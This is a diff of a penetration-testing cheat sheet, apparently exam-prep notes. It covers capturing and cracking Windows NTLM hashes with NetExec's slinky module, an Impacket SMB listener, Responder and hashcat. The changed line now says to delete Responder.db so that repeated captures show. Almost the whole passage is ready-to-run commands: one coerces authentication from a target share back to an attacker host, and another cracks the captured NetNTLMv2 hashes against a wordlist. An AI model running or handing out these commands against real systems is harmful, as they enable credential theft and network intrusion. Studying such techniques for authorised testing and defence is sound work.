@@ -21,7 +21,7 @@ nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M slinky -o SERVER=<LHOST> N
 Just an SMB listener, with no poisoning:
 sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
 - [ ] Captures land in /usr/share/responder/logs/ for Responder; Impacket prints the authentication exchange
-- [ ] Each user shows once in Responder: do not delete Responder.db during an exam to force repeats
+- [ ] Each user shows once in Responder: delete /usr/share/responder/Responder.db to see repeats
 
 ## Crack it
 hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<TargetIP>.txt /usr/share/wordlists/rockyou.txt
